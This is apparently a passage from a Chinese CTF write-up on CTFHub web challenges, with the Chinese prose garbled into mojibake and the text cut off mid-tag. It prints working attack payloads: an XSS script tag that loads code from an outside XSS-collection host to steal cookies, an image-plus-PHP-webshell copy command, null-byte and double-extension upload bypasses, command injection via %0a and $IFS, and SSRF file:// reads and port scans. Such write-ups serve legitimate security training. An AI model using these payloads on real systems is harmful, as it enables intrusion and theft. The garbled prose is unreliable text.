<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span>&#x27;&quot;&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xsscom.com//9VJcMV</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¾“å…¥åˆ°ç¬¬ä¸€ä¸ªæ¡†ä¸­</p>
<p>å†æŠŠæäº¤åçš„urlå¤åˆ¶ï¼Œç„¶ååˆ°ç¬¬äºŒæ¡†ä¸­å‘é€</p>
<p><img src="/post/wp-CTFHub/image-20220731114028909.png" alt="image-20220731114028909"></p>
<p>ç„¶åè¿”å›xssæµ‹è¯•å¹³å°ä¸ŠæŸ¥çœ‹</p>
<p><img src="/post/wp-CTFHub/image-20220731114142138.png" alt="image-20220731114142138"></p>
<p><code>cookie</code>å¤„å‡ºç°<code>flag</code></p>
<h2 id="8-æ–‡ä»¶ä¸Šä¼ -æ–‡ä»¶å¤´æ£€æŸ¥"><a href="#8-æ–‡ä»¶ä¸Šä¼ -æ–‡ä»¶å¤´æ£€æŸ¥" class="headerlink" title="8.æ–‡ä»¶ä¸Šä¼ -æ–‡ä»¶å¤´æ£€æŸ¥"></a>8.æ–‡ä»¶ä¸Šä¼ -æ–‡ä»¶å¤´æ£€æŸ¥</h2><p><code>æ–‡ä»¶å¤´æ˜¯ç›´æ¥ä½äºæ–‡ä»¶ä¸­çš„ä¸€æ®µæ•°æ®,æ˜¯æ–‡ä»¶çš„ä¸€éƒ¨åˆ†</code></p>
<p>è¿™é‡Œè¿‡æ»¤æ–‡ä»¶å¤´ï¼Œè€Œä¸”é™åˆ¶å›¾ç‰‡ç±»å‹æ–‡ä»¶ï¼Œæ‰€ä»¥å¯ä»¥è¯•è¯•ä¸Šä¼ ä¸€ä¸ªæ²¡æœ‰ä»»ä½•é—®é¢˜çš„å›¾ç‰‡ã€æ³¨æ„å›¾ç‰‡ä¸èƒ½å¤ªå¤§ï¼Œä¸ç„¶ä¼šæœ€åç”¨èšå‰‘è¿æ¥ä¼šçˆ†é”™ï¼Œæˆ‘ä¸Šä¼ 1mbå¤§å°å›¾ç‰‡å°±æŠ¥é”™ï¼Œæœ€åä¸Šä¼ 400å­—èŠ‚å›¾ç‰‡æ‰æˆåŠŸã€‘</p>
<p><img src="/post/wp-CTFHub/image-20220731164210465.png" alt="image-20220731164210465"></p>
<p>ä¸Šä¼ å›¾ç‰‡åï¼Œåœ¨åé¢åŠ ä¸Šä¸€å¥è¯æœ¨é©¬ï¼Œå¹¶ä¿®æ”¹æ–‡ä»¶å</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">ã€ä¹Ÿå¯ä»¥ç”¨<span class="keyword">cmd</span><span class="language-bash"> åˆæˆå›¾ç‰‡é©¬ï¼Œä¹Ÿæ˜¯æœ‰å›¾ç‰‡æ–‡ä»¶å¤´ã€‘</span></span><br><span class="line"></span><br><span class="line">ã€<span class="keyword">copy</span><span class="language-bash"> å›¾ç‰‡å.png(.jpg)/b + æœ¨é©¬æ–‡ä»¶å.php(.asp/.aspx)/a ç”Ÿæˆå›¾ç‰‡å.png(.jpg)ã€‘</span></span><br><span class="line"></span><br><span class="line">ã€å·²è¯•å¯è¡Œã€‘</span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-CTFHub/image-20220731164732820.png" alt="image-20220731164732820"></p>
<p>ç„¶åæ­£å¸¸ç”¨èšå‰‘è¿æ¥</p>
<p><img src="/post/wp-CTFHub/image-20220731164330254.png" alt="image-20220731164330254"></p>
<p>å¾—åˆ°<code>flag</code></p>
<h2 id="9-æ–‡ä»¶ä¸Šä¼ -00æˆªæ–­"><a href="#9-æ–‡ä»¶ä¸Šä¼ -00æˆªæ–­" class="headerlink" title="9.æ–‡ä»¶ä¸Šä¼ -00æˆªæ–­"></a>9.æ–‡ä»¶ä¸Šä¼ -00æˆªæ–­</h2><h3 id="0x00æˆªæ–­åŸç†ï¼š-php"><a href="#0x00æˆªæ–­åŸç†ï¼š-php" class="headerlink" title="0x00æˆªæ–­åŸç†ï¼š[php&lt;5.3.29]"></a>0x00æˆªæ–­åŸç†ï¼š[php&lt;5.3.29]</h3><figure class="highlight cos"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>x00æ˜¯åå…­è¿›åˆ¶è¡¨ç¤ºæ–¹æ³•ï¼Œæ˜¯<span class="keyword">ascii</span>ç ä¸º<span class="number">0</span>çš„å­—ç¬¦ï¼Œåœ¨æœ‰äº›å‡½æ•°å¤„ç†æ—¶ï¼Œä¼šæŠŠè¿™ä¸ªå­—ç¬¦å½“åšç»“æŸç¬¦ã€‚ç³»ç»Ÿåœ¨å¯¹æ–‡ä»¶åçš„è¯»å–æ—¶ï¼Œå¦‚æœé‡åˆ°<span class="number">0</span>x00ï¼Œå°±ä¼šè®¤ä¸ºè¯»å–å·²ç»“æŸã€‚è¿™ä¸ªå¯ä»¥ç”¨åœ¨å¯¹æ–‡ä»¶ç±»å‹åçš„ç»•è¿‡ä¸Šã€‚</span><br><span class="line"></span><br><span class="line">ä½†è¦æ³¨æ„æ˜¯æ–‡ä»¶çš„<span class="number">16</span>è¿›åˆ¶å†…å®¹é‡Œçš„<span class="number">00</span>ï¼Œè€Œä¸æ˜¯æ–‡ä»¶åä¸­çš„<span class="number">00</span> ï¼ï¼ï¼å°±æ˜¯è¯´ç³»ç»Ÿæ˜¯æŒ‰<span class="number">16</span>è¿›åˆ¶è¯»å–æ–‡ä»¶ï¼ˆæˆ–è€…è¯´äºŒè¿›åˆ¶ï¼‰ï¼Œ</span><br><span class="line"></span><br><span class="line">é‡åˆ°<span class="keyword">ascii</span>ç ä¸ºé›¶çš„ä½ç½®å°±åœæ­¢ï¼Œè€Œè¿™ä¸ª<span class="keyword">ascii</span>ç ä¸ºé›¶çš„ä½ç½®åœ¨<span class="number">16</span>è¿›åˆ¶ä¸­æ˜¯<span class="number">00</span>ï¼Œç”¨<span class="number">0</span><span class="keyword">x</span>å¼€å¤´è¡¨ç¤º<span class="number">16</span>è¿›åˆ¶ï¼Œä¹Ÿå°±æ˜¯æ‰€è¯´çš„<span class="number">0</span>x00æˆªæ–­ã€‚</span><br><span class="line"></span><br><span class="line">%<span class="number">00</span>æ˜¯è¢«æœåŠ¡å™¨è§£ç ä¸º<span class="number">0</span>x00å‘æŒ¥äº†æˆªæ–­ä½œç”¨ã€‚</span><br></pre></td></tr></table></figure>

<p><code>ä¸¾ä¸ªä¾‹å­ï¼Œurlä¸­è¾“å…¥çš„æ˜¯upload/post.php%00.pngï¼Œçœ‹æ ·å­æ˜¯å›¾ç‰‡æ–‡ä»¶ï¼Œé‚£ä¹ˆåå°è¯»å–åˆ°æ˜¯upload/post.phpï¼Œå°±å®ç°äº†ç»•åç›®çš„ã€‚</code></p>
<p>æˆ‘ä»¬å¼€å§‹å…ˆä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶è¯•è¯•ï¼Œé™åˆ¶<code>jpg,png,gif</code>åç¼€</p>
<p>ä¸Šä¼ æˆåŠŸåï¼Œæ²¡æœ‰æ˜¾ç¤ºä¸Šä¼ è·¯å¾„ï¼Œåªæ˜¯urlå˜åŒ–</p>
<p><code>http://challenge-6cc6a23c8f284d6b.sandbox.ctfhub.com:10800/?road=/var/www/html</code></p>
<p> çŒœæƒ³å¤šåŠé‡æ–°ä¸´æ—¶æ–‡ä»¶åï¼Œä¸å›ºå®šï¼Œå¯¼è‡´æ˜¾ç¤ºä¸äº†è·¯å¾„</p>
<p>è¿™é‡Œå°±éœ€è¦<code>00æˆªæ–­</code>ï¼Œè¦æŠŠæ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„ï¼Œæ‰¾åˆ°ï¼Œå¥½ç”¨èšå‰‘è¿æ¥</p>
<p>å…ˆè¦æ¸…æ¥š<code>%00</code>æˆªæ–­ç‚¹åœ¨å“ªé‡Œï¼Œæˆ‘ä»¬å…ˆF12çœ‹</p>
<p>çœ‹ç½‘ç«™æºç </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CTFHub æ–‡ä»¶ä¸Šä¼  - 00æˆªæ–­<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>CTFHub æ–‡ä»¶ä¸Šä¼  - 00æˆªæ–­<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">?road</span>=<span class="string">/var/www/html/upload/</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">if (!empty($_POST[&#x27;submit&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">    $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span></span><br><span class="line"><span class="comment">    $info = pathinfo($name);</span></span><br><span class="line"><span class="comment">    $ext = $info[&#x27;extension&#x27;];</span></span><br><span class="line"><span class="comment">    $whitelist = array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;);</span></span><br><span class="line"><span class="comment">    if (in_array($ext, $whitelist)) &#123;</span></span><br><span class="line"><span class="comment">        $des = $_GET[&#x27;road&#x27;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;</span></span><br><span class="line"><span class="comment">        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $des)) &#123;</span></span><br><span class="line"><span class="comment">            echo &quot;&lt;script&gt;alert(&#x27;ä¸Šä¼ æˆåŠŸ&#x27;)&lt;/script&gt;&quot;;</span></span><br><span class="line"><span class="comment">        &#125; else &#123;</span></span><br><span class="line"><span class="comment">            echo &quot;&lt;script&gt;alert(&#x27;ä¸Šä¼ å¤±è´¥&#x27;)&lt;/script&gt;&quot;;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125; else &#123;</span></span><br><span class="line"><span class="comment">        echo &quot;æ–‡ä»¶ç±»å‹ä¸åŒ¹é…&quot;;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å‘ç°é‡Œé¢æœ‰ä¸€ä¸²ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$ext</span> = <span class="variable">$info</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">    <span class="variable">$whitelist</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;gif&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="variable">$des</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;road&#x27;</span>] . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>) . <span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>) . <span class="string">&quot;.&quot;</span> . <span class="variable">$ext</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$des</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;ä¸Šä¼ æˆåŠŸ&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;ä¸Šä¼ å¤±è´¥&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æ–‡ä»¶ç±»å‹ä¸åŒ¹é…&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p><code>move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],$des)</code>è¿™ä¸ªå‡½æ•°å°±æ˜¯æŠŠä¸Šä¼ æ–‡ä»¶æ”¾åˆ°<code>$des</code>çš„è·¯å¾„ä¸Šå¹¶ä¸”æ”¹äº†æ–‡ä»¶å</p>
<p>æ‰€ä»¥æˆ‘ä»¬ä¸èƒ½è®©åé¢çš„<code>rand()</code>å’Œ<code>date()</code>è¿è¡Œï¼Œæ‰€ä»¥å¯¹äºå˜é‡<code>road</code>ã€ä¹Ÿå°±æ˜¯å¼€å§‹è®²åˆ°çš„ã€‘ï¼Œå°±éœ€è¦åœ¨å®ƒåé¢åŠ ä¸Šä¸€ä¸ª<code>%00</code>æˆªæ–­åé¢çš„è¯­å¥</p>
<p>ä¹Ÿå°±æ˜¯ä¸‹é¢è¿™ä¸ªè¯·æ±‚å¤´åé¢</p>
<p><img src="/post/wp-CTFHub/image-20220731233456720.png" alt="image-20220731233456720"></p>
<p>å›¾ç‰‡æ­£å¸¸ä¸Šä¼ å°±å¯ä»¥ï¼Œè¿™å°±æ˜¯æŠŠå›¾ç‰‡å†…å®¹ä¸Šä¼ åˆ°<code>1.php</code>æ–‡ä»¶ä¸­ï¼Œè¿™æ ·è™½ç„¶æˆ‘ä»¬ä¸Šä¼ çš„æ˜¯ä¸€ä¸ªå›¾ç‰‡ï¼Œä½†å®é™…ä¸Šï¼Œæˆ‘ä»¬ä¸Šä¼ äº†ä¸€ä¸ªåä¸º<code>1.php</code>çš„ä¸€å¥è¯æœ¨é©¬</p>
<p>ã€åå­—ä¸é‡è¦ï¼Œè™½ç„¶å›¾ç‰‡å’Œ<code>php</code>æ–‡ä»¶åä¸€æ ·ï¼Œè¿™é‡Œ<code>1.php</code>æ˜¯éšä¾¿å–å¾—ï¼Œä¸»è¦èšå‰‘è¿æ¥çš„å°±æ˜¯å®ƒã€‘</p>
<p><img src="/post/wp-CTFHub/image-20220731233716114.png"></p>
<p>ç”¨èšå‰‘è¿æ¥<code>url/upload/1.php</code></p>
<p>å¾—åˆ°<code>flag</code></p>
<h2 id="10-æ–‡ä»¶ä¸Šä¼ -åŒå†™åç¼€"><a href="#10-æ–‡ä»¶ä¸Šä¼ -åŒå†™åç¼€" class="headerlink" title="10.æ–‡ä»¶ä¸Šä¼ -åŒå†™åç¼€"></a>10.æ–‡ä»¶ä¸Šä¼ -åŒå†™åç¼€</h2><p>è¿›è¡Œäº†ä¸€æ¬¡è¿‡æ»¤phpåç¼€åï¼ŒåŒå†™phpä¸ºp<u>php</u>hpï¼Œè¿™æ ·å½“è¿‡æ»¤äº†__çš„phpï¼Œå‰©ä¸‹çš„ä»ç„¶æ˜¯phpï¼Œæ­£å¸¸ç”¨èšå‰‘è¿æ¥</p>
<p><img src="/post/wp-CTFHub/image-20220731165549883.png" alt="image-20220731165549883"></p>
<p><img src="/post/wp-CTFHub/image-20220731165841829.png" alt="image-20220731165841829"></p>
<p>å¾—åˆ°flag</p>
<h2 id="11-RCE-å‘½ä»¤æ³¨å…¥-ç»¼åˆè®­ç»ƒ"><a href="#11-RCE-å‘½ä»¤æ³¨å…¥-ç»¼åˆè®­ç»ƒ" class="headerlink" title="11.RCE-å‘½ä»¤æ³¨å…¥-ç»¼åˆè®­ç»ƒ"></a>11.RCE-å‘½ä»¤æ³¨å…¥-ç»¼åˆè®­ç»ƒ</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="literal">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 <span class="subst">&#123;$ip&#125;</span>&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜</p>
<p>çœ‹åˆ°<code>|ï¼Œ;ï¼Œ&amp;</code>éƒ½è¢«è¿‡æ»¤äº†</p>
<p>é‚£ä¹ˆå¯ä»¥ç”¨<code>%0a</code>ä¹Ÿæ˜¯æ¢è¡Œç¬¦ä»£æ›¿</p>
<p>ç©ºæ ¼ï¼Œ&#x2F;ï¼Œcatï¼Œflagï¼Œctfhubï¼ˆè¿™äº›å¥½åƒä¸å¤§ç”¨çš„ä¸Šï¼Œæ²¡å…³ç³»ï¼‰</p>
<p><code>$IFS</code>ä»£æ›¿<code>ç©ºæ ¼</code>ï¼Œ<code>cat</code>å¯ä»¥ç”¨<code>more</code>ä»£æ›¿ï¼Œ<code>%09</code>ä»£æ›¿<code>TAB</code>é”®ï¼Œç”¨æ¥è¡¥å…¨<code>flag</code></p>
<p><code>?ip=120.0.0.1%0als</code></p>
<p><img src="/post/wp-CTFHub/image-20220801215911504.png" alt="image-20220801215911504"></p>
<p>ç„¶å</p>
<p><code>?ip=120.0.0.1%0acd$IFS%09*_is_here%0als</code></p>
<p><img src="/post/wp-CTFHub/image-20220801215930160.png" alt="image-20220801215930160"></p>
<p>åé¢å°±ç®€å•äº†</p>
<p><code>?ip=120.0.0.1%0acd$IFS%09*_is_here%0amore$IFS%09*24135173615424.php</code></p>
<p>å³é”®æŸ¥çœ‹æºç </p>
<p>å¾—åˆ°<code>flag</code></p>
<h2 id="12-SSRF-å†…ç½‘è®¿é—®"><a href="#12-SSRF-å†…ç½‘è®¿é—®" class="headerlink" title="12.SSRF-å†…ç½‘è®¿é—®"></a>12.SSRF-å†…ç½‘è®¿é—®</h2><p><img src="/post/wp-CTFHub/image-20220802103546644.png" alt="image-20220802103546644"></p>
<p><img src="/post/wp-CTFHub/image-20220802103603770.png" alt="image-20220802103603770"></p>
<p>æ‰€ä»¥æ„é€ payload</p>
<p><code>http://challenge-c0c40a8ea91b3909.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</code></p>
<p>å¾—åˆ°flag</p>
<h2 id="13-SSRF-ä¼ªåè®®è¯»å–æ–‡ä»¶"><a href="#13-SSRF-ä¼ªåè®®è¯»å–æ–‡ä»¶" class="headerlink" title="13.SSRF-ä¼ªåè®®è¯»å–æ–‡ä»¶"></a>13.SSRF-ä¼ªåè®®è¯»å–æ–‡ä»¶</h2><h3 id="ä¼ªåè®®"><a href="#ä¼ªåè®®" class="headerlink" title="ä¼ªåè®®"></a>ä¼ªåè®®</h3><p>äº‹å®ä¸Šæ˜¯å…¶æ”¯æŒçš„åè®®ä¸å°è£…åè®®ã€‚è€Œå…¶æ”¯æŒçš„éƒ¨åˆ†åè®®æœ‰ï¼š</p>
<pre><code>    file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ

    http:// â€” è®¿é—® HTTP(s) ç½‘å€

    ftp:// â€” è®¿é—® FTP(s) URLs

    php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµ(I/O streams)
</code></pre>
<p>æ ¹æ®æç¤ºï¼Œflagåœ¨Webç›®å½•ä¸‹ï¼ŒWebç›®å½•ä¸€èˆ¬æ˜¯åœ¨<code>/var/www/html/</code>ä¸‹</p>
<p><code>http://challenge-5c45d983b45e22b7.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php</code></p>
<p>å¾—åˆ°flag</p>
<h2 id="14-SSRF-ç«¯å£æ‰«æ"><a href="#14-SSRF-ç«¯å£æ‰«æ" class="headerlink" title="14.SSRF-ç«¯å£æ‰«æ"></a>14.SSRF-ç«¯å£æ‰«æ</h2><p>ç«¯å£æ‰«æï¼Œé‚£å°±åˆ©ç”¨çˆ†ç ´ï¼Œä»8000åˆ°9000æ‰«ä¸€éï¼Œçœ‹çœ‹flagåœ¨å“ªä¸ªç«¯å£ä¸‹</p>
<p><code>http://challenge-30d6aa92f511ee1f.sandbox.ctfhub.com:10800/?url=127.0.0.1:8000</code></p>
<p><img src="/post/wp-CTFHub/image-20220802105640721.png" alt="image-20220802105640721"></p>
<p>çœ‹åˆ°é•¿åº¦ä¸åŒï¼Œæ‰“å¼€æŸ¥çœ‹å“åº”æ•°æ®åŒ…</p>
<p>å¾—åˆ°flag</p>
<h2 id="15-SSRF-POSTè¯·æ±‚"><a href="#15-SSRF-POSTè¯·æ±‚" class="headerlink" title="15.SSRF-POSTè¯·æ±‚"></a>15.SSRF-POSTè¯·æ±‚</h2><p><code>hintï¼šè¿™æ¬¡æ˜¯å‘ä¸€ä¸ªHTTP POSTè¯·æ±‚.å¯¹äº†.ssrfæ˜¯ç”¨phpçš„curlå®ç°çš„.å¹¶ä¸”ä¼šè·Ÿè¸ª302è·³è½¬.åŠ æ²¹å§éªšå¹´</code></p>
<p>å¼€å§‹æ˜¯ä¸€ä¸ªç©ºç™½é¡µé¢</p>
<p>ç½‘ç«™ä¸º</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://challenge-<span class="number">177</span>dcd6de76352cb.sandbox.ctfhub.com:<span class="number">10800</span>/?url=_</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬åœ¨å…¶åé¢åŠ ä¸Š<code>127.0.0.1/flag.php</code>çœ‹çœ‹èƒ½ä¸èƒ½ç›´æ¥è®¿é—®è¯¥æ–‡ä»¶</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://challenge-<span class="number">177</span>dcd6de76352cb.sandbox.ctfhub.com:<span class="number">10800</span>/?url=<span class="number">127.0.0.1</span>/flag.php</span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-CTFHub/image-20220925221703912.png" alt="image-20220925221703912"></p>
<p>å‘ç°å‡ºç°äº†ä¸€ä¸ªè¾“å…¥æ¡†</p>
<p><code>F12</code>æŸ¥çœ‹æºç ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/flag.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- De<span class="doctag">bug:</span> key=11e053e2b7900523ac51fc7606b964e2--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å‘ç°äº†ä¸€ä¸ª<code>key</code>çš„å‚æ•°</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line"><span class="built_in">key</span>=11e053e2b7900523ac51fc7606b964e2</span><br><span class="line">//<span class="built_in">key</span>æ˜¯ä¸å®šçš„å“ˆï¼Œä¸è¦å…¨<span class="built_in">copy</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æŠŠ<code>key</code>å€¼è¾“å…¥æ¡†ä¸­è¯•è¯•</p>
<p><img src="/post/wp-CTFHub/image-20220925222739689.png" alt="image-20220925222739689"></p>
<p>çœ‹æ¥åªèƒ½ä»æœ¬åœ°<code>127.0.0.1</code>è®¿é—®</p>
<p>åˆ©ç”¨<code>file://</code>ä¼ªåè®®ä»æœ¬åœ°æ–¹å¼è®¿é—®æ–‡ä»¶çœ‹çœ‹<code>index.php</code>æ–‡ä»¶</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge-<span class="number">177</span>dcd6de76352cb.sandbox.ctfhub.com:<span class="number">10800</span><span class="regexp">/?url=file:/</span><span class="regexp">//</span>var<span class="regexp">/www/</span>html/index.php</span><br></pre></td></tr></table></figure>

<p>å³é”®æŸ¥çœ‹ï¼Œ</p>
<p>å¾—åˆ°<code>index.php</code>æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure>

<p>ä»¥ç›¸åŒæ–¹å¼çœ‹çœ‹<code>flag.php</code>æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;</span><br><span class="line">    echo &quot;Just View From 127.0.0.1&quot;;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag=getenv(&quot;CTFHUB&quot;);</span><br><span class="line">$key = md5($flag);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span 